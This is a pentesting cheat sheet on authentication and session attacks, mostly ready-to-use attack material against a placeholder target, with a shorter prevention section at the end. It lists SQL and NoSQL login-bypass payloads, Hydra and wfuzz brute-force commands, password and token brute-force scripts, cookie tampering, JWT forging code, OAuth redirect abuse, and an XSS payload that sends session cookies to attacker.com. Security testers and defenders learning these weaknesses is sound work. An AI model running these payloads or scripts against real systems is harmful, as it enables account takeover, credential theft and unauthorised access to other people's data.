# Authentication & Session Management Attacks - Comprehensive Guide

## Table of Contents
1. [Introduction](#introduction)
2. [Authentication Bypass](#authentication-bypass)
3. [Password Attacks](#password-attacks)
4. [Session Management Attacks](#session-management-attacks)
5. [JWT Attacks](#jwt-attacks)
6. [OAuth & SAML Attacks](#oauth--saml-attacks)
7. [Multi-Factor Authentication Bypass](#multi-factor-authentication-bypass)
8. [Scanning Tools](#scanning-tools)
9. [Prevention & Mitigation](#prevention--mitigation)

---

## Introduction

Authentication and session management vulnerabilities allow attackers to compromise passwords, keys, session tokens, or exploit implementation flaws to assume other users' identities.

**Impact**:
- Account takeover
- Unauthorized access to sensitive data
- Privilege escalation
- Identity theft
- Data breaches
- Compliance violations

---

## Authentication Bypass

### 1. SQL Injection in Login

**Vulnerable Code**:
```sql
SELECT * FROM users WHERE username='$user' AND password='$pass'
```

**Bypass Payloads**:
```sql
admin' OR '1'='1'--
admin' OR '1'='1'/*
admin' OR '1'='1'#
admin'--
admin' #
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
' OR 1=1--
admin') OR ('1'='1'--
admin') OR '1'='1'#
```

**Detection**:
```bash
# Test with single quote
curl -X POST https://target.com/login -d "username=admin'&password=test"

# If error or different response → SQLi possible
```

### 2. NoSQL Injection

**MongoDB Login Bypass**:
```json
# POST /login
{
  "username": {"$ne": null},
  "password": {"$ne": null}
}

{
  "username": {"$gt": ""},
  "password": {"$gt": ""}
}

{
  "username": "admin",
  "password": {"$regex": ".*"}
}
```

**URL Encoded**:
```
username[$ne]=null&password[$ne]=null
username[$gt]=&password[$gt]=
```

**Testing**:
```bash
# JSON request
curl -X POST https://target.com/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":null},"password":{"$ne":null}}'

# URL encoded
curl -X POST https://target.com/login \
  -d "username[$ne]=null&password[$ne]=null"
```

### 3. Username Enumeration

**Indicators**:
- Different error messages: "Invalid password" vs "User not found"
- Different response times
- Different HTTP status codes
- Different response lengths

**Testing**:
```bash
# Existing user
curl -X POST https://target.com/login -d "username=admin&password=wrong"
# Response: "Invalid password" (200 OK)

# Non-existing user
curl -X POST https://target.com/login -d "username=nonexistent&password=wrong"
# Response: "User not found" (404 Not Found)

# This confirms username enumeration
```

**Automation**:
```python
import requests

usernames = ['admin', 'root', 'test', 'user', 'administrator']
url = "https://target.com/login"

for username in usernames:
    r = requests.post(url, data={
        'username': username,
        'password': 'wrongpassword'
    })

    # Check for different responses
    if "Invalid password" in r.text:
        print(f"[+] Valid username: {username}")
    elif "User not found" in r.text:
        print(f"[-] Invalid username: {username}")
```

### 4. Default Credentials

**Common Defaults**:
```
admin:admin
admin:password
root:root
root:toor
admin:admin123
administrator:administrator
admin:12345
admin:""
guest:guest
test:test
```

**Testing**:
```bash
# Automated with Hydra
hydra -C /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt \
  https-post-form target.com "/login:username=^USER^&password=^PASS^:F=incorrect"
```

### 5. Logic Flaws

**Example 1: Parameter Manipulation**
```http
# Normal login
POST /login
username=user&password=pass

# Try
POST /login
username=admin&password=pass&authenticated=true

POST /login
username=admin&password=pass&role=admin
```

**Example 2: Response Manipulation**
```json
# Server response
{"authenticated": false, "username": "admin"}

# Intercept and change to
{"authenticated": true, "username": "admin"}
```

**Example 3: Missing Validation**
```http
# Password reset flow
POST /reset-password/verify
code=123456

# Skip verification
POST /reset-password/change
new_password=hacked
# If no verification check → bypass
```

---

## Password Attacks

### 1. Brute Force

**Tools**:

**Hydra**:
```bash
# HTTP POST form
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com https-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"

# With CSRF token
hydra -l admin -P passwords.txt target.com https-post-form "/login:username=^USER^&password=^PASS^:csrf=^CSRF^:F=incorrect"

# Multiple usernames
hydra -L users.txt -P passwords.txt target.com https-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
```

**Wfuzz**:
```bash
# Basic password brute force (POST request)
wfuzz -u http://bambi/dev/index.php -d "username=bob&password=FUZZ" -w /usr/share/wordlists/rockyou.txt --hs "Incorrect" 
wfuzz -c -z file,/usr/share/wordlists/rockyou.txt -d "username=admin&password=FUZZ"  --hs "Incorrect" https://target.com/login

# Username and password brute force
wfuzz -c -z file,usernames.txt -z file,passwords.txt -d "username=FUZZ&password=FUZ2Z"  https://target.com/login

# Hide responses by code
wfuzz -c -z file,passwords.txt -d "username=admin&password=FUZZ" --hc 401,403 https://target.com/login

# With custom headers
wfuzz -c -z file,passwords.txt -H "Content-Type: application/x-www-form-urlencoded" -H "X-Forwarded-For: 127.0.0.1" -d "username=admin&password=FUZZ"  https://target.com/login

# JSON POST request
wfuzz -c -z file,passwords.txt -H "Content-Type: application/json" -d '{"username":"admin","password":"FUZZ"}'  https://target.com/api/login

# Show only successful attempts (by response length)
wfuzz -c -z file,passwords.txt -d "username=admin&password=FUZZ" --sh 5678 https://target.com/login

# Filter by response regex
wfuzz -c -z file,passwords.txt -d "username=admin&password=FUZZ" --ss "Welcome" https://target.com/login

# Hide by response regex (hide error messages)
wfuzz -c -z file,passwords.txt -d "username=admin&password=FUZZ" --hs "incorrect|invalid|failed" https://target.com/login

# With cookies
wfuzz -c -z file,passwords.txt -b "session=abc123;csrf=xyz789" -d "username=admin&password=FUZZ" https://target.com/login

# Multiple FUZZ points with different wordlists
wfuzz -c -z file,usernames.txt -z file,passwords.txt -d "user=FUZZ&pass=FUZ2Z&submit=login" --hc 200 https://target.com/login

# Rate limiting (10 requests per second)
wfuzz -c -z file,passwords.txt -d "username=admin&password=FUZZ" -t 10 -s 0.1  https://target.com/login
```

**Burp Intruder**:
```
1. Intercept login request
2. Send to Intruder
3. Mark password field
4. Payload: Load password list
5. Grep-Match: "Welcome" or success indicator
6. Start attack
```

**Custom Script**:
```python
import requests

url = "https://target.com/login"
usernames = ['admin']
passwords = open('passwords.txt').read().splitlines()

for password in passwords:
    data = {'username': 'admin', 'password': password}
    r = requests.post(url, data=data)

    if "Welcome" in r.text or r.status_code == 302:
        print(f"[+] Found password: {password}")
        break
```

### 2. Credential Stuffing

**Using Previously Breached Credentials**:
```bash
# Format: username:password
admin:Password123
user@example.com:qwerty123
```

**Tools**:
```bash
# snipr
python3 snipr.py -t https://target.com/login \
  -c breached-credentials.txt

# OpenBullet
# GUI-based credential stuffing tool
```

### 3. Password Reset Exploitation

**Vulnerabilities**:

**A. Token Prediction**
```
# Sequential tokens
reset-token=100001
reset-token=100002 (predictable)

# Timestamp-based
reset-token=1634567890 (Unix timestamp)
```

**B. Token Reuse**
```
# Get token for user A
# Use same token for user B
# If not user-specific → bypass
```

**C. Host Header Injection**
```http
POST /forgot-password HTTP/1.1
Host: attacker.com
...
email=victim@target.com

# Reset link sent to victim contains:
# https://attacker.com/reset?token=abc123
```

**D. Token Leakage**
```
# Check for token in:
- Referer header
- Server logs
- Email headers
- Analytics
```

**E. No Rate Limiting**
```bash
# Brute force reset token
for i in {1000..9999}; do
    curl "https://target.com/reset-password?token=$i&new_pass=hacked"
done
```

---

## Session Management Attacks

### 1. Session Fixation

**Attack**:
```
1. Attacker gets session ID: SID=abc123
2. Victim logs in with SID=abc123 (not regenerated)
3. Attacker uses SID=abc123 (authenticated as victim)
```

**Detection**:
```bash
# Before login
curl -I https://target.com/
# Note Set-Cookie: session=xyz789

# Login
curl -b "session=xyz789" -X POST https://target.com/login \
  -d "username=user&password=pass"

# Check if session changed
# If still xyz789 → Session Fixation vulnerable
```

### 2. Session Prediction

**Weak Session IDs**:
```
# Sequential
session=1001, 1002, 1003

# Timestamp-based
session=1634567890

# MD5 of predictable value
session=md5(username+timestamp)
```

**Analysis**:
```python
import requests

sessions = []

# Collect multiple session IDs
for i in range(20):
    r = requests.get('https://target.com/')
    session = r.cookies.get('session')
    sessions.append(session)

# Analyze for patterns
for s in sessions:
    print(s)

# Look for:
# - Sequential patterns
# - Timestamp correlation
# - Short length (weak entropy)
```

### 3. Cookie Manipulation

**Insecure Cookie Flags**:
```http
Set-Cookie: session=abc123
# Missing: HttpOnly, Secure, SameSite
```

**Cookie Tampering**:
```bash
# Base64 encoded cookie
session=eyJ1c2VyIjoidXNlciJ9  # {"user":"user"}

# Decode
echo "eyJ1c2VyIjoidXNlciJ9" | base64 -d
# {"user":"user"}

# Modify
echo '{"user":"admin"}' | base64
# eyJ1c2VyIjoiYWRtaW4ifQ==

# Use modified cookie
curl -b "session=eyJ1c2VyIjoiYWRtaW4ifQ==" https://target.com/admin
```

**Cookie Signing Bypass**:
```python
# Flask session cookie (if secret is weak)
from flask.sessions import SecureSessionInterface

secret = "weak-secret"  # Brute force or guess

# Create forged session
session_data = {"user": "admin", "role": "admin"}
# Sign with secret
```

### 4. Session Hijacking via XSS

```javascript
// Steal session cookie
<script>
fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>

// Use stolen cookie
curl -b "session=stolen_value" https://target.com/
```

### 5. Logout Not Implemented

**Test**:
```bash
# Login
curl -c cookies.txt -X POST https://target.com/login \
  -d "username=admin&password=pass"

# Logout
curl -b cookies.txt https://target.com/logout

# Try accessing protected resource
curl -b cookies.txt https://target.com/admin

# If accessible → logout not properly implemented
```

---

## JWT Attacks

### 1. None Algorithm Attack

**Vulnerable JWT**:
```json
// Header
{
  "alg": "HS256",
  "typ": "JWT"
}

// Modified to
{
  "alg": "none",
  "typ": "JWT"
}

// Remove signature
```

**Exploit**:
```python
import base64
import json

# Original JWT: header.payload.signature
header = {"alg": "none", "typ": "JWT"}
payload = {"user": "admin", "role": "admin"}

# Encode
header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')

# Create JWT without signature
jwt = f"{header_b64}.{payload_b64}."

print(jwt)
```

### 2. Weak Secret Brute Force

**Tools**:
```bash
# JWT_Tool
python3 jwt_tool.py <JWT> -C -d /usr/share/wordlists/rockyou.txt

# hashcat
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt jwt.txt
```

**JWT Format for Hashcat**:
```
<JWT>
```

### 3. Algorithm Confusion (RS256 to HS256)

**Attack**:
```python
# If server accepts both RS256 and HS256
# Get public key
# Sign JWT with public key using HS256
# Server verifies with public key thinking it's HS256 secret

import jwt

public_key = open('public.pem').read()

# Create payload
payload = {"user": "admin", "role": "admin"}

# Sign with HS256 using public key as secret
token = jwt.encode(payload, public_key, algorithm='HS256')

print(token)
```

### 4. JWT Header Injection

**kid (Key ID) Injection**:
```json
{
  "alg": "HS256",
  "kid": "../../../dev/null"
}
// Signs with empty key (null bytes)
```

**jku (JWK Set URL) Injection**:
```json
{
  "alg": "RS256",
  "jku": "https://attacker.com/jwks.json"
}
// Points to attacker's key
```

### 5. JWT Expiration Bypass

**Test**:
```bash
# Get valid JWT
# Wait for expiration (check 'exp' claim)
# Try using expired JWT

# If still works → no expiration check
```

### Tools

**JWT_Tool**:
```bash
# Install
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool
pip3 install -r requirements.txt

# Scan for vulnerabilities
python3 jwt_tool.py <JWT> -M at

# All tests
python3 jwt_tool.py <JWT> -M pb

# Crack secret
python3 jwt_tool.py <JWT> -C -d wordlist.txt

# Tamper payload
python3 jwt_tool.py <JWT> -T
```

**Burp JWT Extension**:
```
Install: Extender → BApp Store → JWT Editor

Usage:
1. Intercept request with JWT
2. Decode in JWT Editor tab
3. Modify claims
4. Re-sign (if you have secret)
5. Send request
```

---

## OAuth & SAML Attacks

### 1. OAuth Misconfiguration

**Open Redirect in redirect_uri**:
```
https://provider.com/oauth/authorize?
  client_id=123&
  redirect_uri=https://attacker.com&
  response_type=code

# Authorization code sent to attacker
```

**Weak redirect_uri Validation**:
```
# Allowed: https://target.com/callback
# Try:
https://target.com.attacker.com/callback
https://target.com/callback?redir=https://attacker.com
https://target.com/callback#attacker.com
```

**State Parameter Missing (CSRF)**:
```
# No state parameter
https://provider.com/oauth/authorize?
  client_id=123&
  redirect_uri=https://target.com/callback&
  response_type=code

# CSRF: Attacker initiates OAuth, victim completes
```

### 2. SAML Attacks

**SAML Response Manipulation**:
```xml
<!-- Original -->
<saml:Assertion>
  <saml:Subject>
    <saml:NameID>user@example.com</saml:NameID>
  </saml:Subject>
</saml:Assertion>

<!-- Modified -->
<saml:Assertion>
  <saml:Subject>
    <saml:NameID>admin@example.com</saml:NameID>
  </saml:Subject>
</saml:Assertion>
```

**Signature Wrapping**:
```xml
<!-- Move signature to different element -->
<!-- Verifier checks signature of one element -->
<!-- Processor uses different element -->
```

**Tools**:
```bash
# SAML Raider (Burp Extension)
# Install from BApp Store
# Intercept SAML requests/responses
# Modify and replay
```

---

## Multi-Factor Authentication Bypass

### 1. Response Manipulation

**Attack**:
```json
// Server response
{"mfa_required": true, "authenticated": false}

// Intercept and change to
{"mfa_required": false, "authenticated": true}
```

### 2. Direct Request

**Bypass MFA Page**:
```
# Normal flow
1. /login → 2. /mfa → 3. /dashboard

# Bypass
1. /login → 3. /dashboard (skip step 2)
```

### 3. Backup Codes Brute Force

**Attack**:
```bash
# If no rate limiting on backup codes
for code in {000000..999999}; do
    curl -X POST https://target.com/mfa \
      -d "backup_code=$code&session=xyz"
done
```

### 4. OAuth Integration

**Bypass**:
```
# If app allows OAuth login
# OAuth may not enforce MFA
# Login via OAuth → bypass MFA
```

### 5. Remember Me Feature

**Attack**:
```
# Check "Remember this device"
# Steal remember_token cookie
# Use on different device → MFA bypassed
```

---

## Scanning Tools

### 1. Hydra (Brute Force)
```bash
hydra -l admin -P passwords.txt \
  https-post-form "target.com/login:username=^USER^&password=^PASS^:F=incorrect"
```

### 2. Burp Suite
- Intruder for brute force
- Repeater for logic testing
- JWT Editor extension
- SAML Raider extension
- Autorize for session testing

### 3. JWT_Tool
```bash
python3 jwt_tool.py <JWT> -M at
```

### 4. Postman
- API authentication testing
- OAuth flow testing
- Token management

### 5. Custom Scripts
```python
# See examples throughout this guide
```

---

## Prevention & Mitigation

### 1. Secure Authentication

```php
// Use password_hash (bcrypt)
$hash = password_hash($password, PASSWORD_BCRYPT);

// Verify
if (password_verify($input_password, $hash)) {
    // Authenticated
}

// Generic error messages (prevent enumeration)
if (!authenticate($username, $password)) {
    die("Invalid credentials");  // Don't reveal if username exists
}
```

### 2. Strong Session Management

```php
// Regenerate session ID on login
session_regenerate_id(true);

// Set secure cookie flags
session_set_cookie_params([
    'lifetime' => 3600,
    'path' => '/',
    'domain' => 'example.com',
    'secure' => true,      // HTTPS only
    'httponly' => true,    // No JavaScript access
    'samesite' => 'Strict' // CSRF protection
]);

// Session timeout
if (time() - $_SESSION['last_activity'] > 1800) {
    session_destroy();
}
$_SESSION['last_activity'] = time();

// Proper logout
session_destroy();
setcookie('session', '', time()-3600);
```

### 3. Rate Limiting

```python
from flask_limiter import Limiter

limiter = Limiter(app, key_func=get_remote_address)

@app.route('/login', methods=['POST'])
@limiter.limit("5 per minute")
def login():
    # Login logic
```

### 4. Secure JWT Implementation

```javascript
// Use strong secret (256+ bits random)
const secret = crypto.randomBytes(32).toString('hex');

// Set expiration
const token = jwt.sign(
    {user: 'admin'},
    secret,
    {expiresIn: '1h', algorithm: 'HS256'}
);

// Verify
jwt.verify(token, secret, {algorithms: ['HS256']});

// Don't accept 'none' algorithm
```

### 5. MFA Implementation

```python
# Require MFA for sensitive operations
@app.route('/admin')
@login_required
@mfa_required
def admin_panel():
    return render_template('admin.html')

# Time-based verification
if not verify_totp(user_secret, totp_code, window=1):
    return "Invalid MFA code"
```

### Security Checklist

- [ ] Use strong password hashing (bcrypt, Argon2)
- [ ] Implement account lockout (5 failed attempts)
- [ ] Rate limit authentication endpoints
- [ ] Use secure session management
- [ ] Regenerate session IDs on login
- [ ] Set HttpOnly, Secure, SameSite cookie flags
- [ ] Implement session timeout
- [ ] Proper logout functionality
- [ ] Generic error messages (no enumeration)
- [ ] Strong JWT secrets (256+ bits)
- [ ] JWT expiration enforcement
- [ ] Reject 'none' algorithm
- [ ] Multi-factor authentication for sensitive accounts
- [ ] Secure password reset flow
- [ ] Regular security audits
- [ ] Monitor for suspicious activity

---

**Additional Resources**:
- OWASP Authentication Cheat Sheet
- OWASP Session Management Cheat Sheet
- JWT.io
- HackTricks - Login Bypass
- PortSwigger Authentication Labs
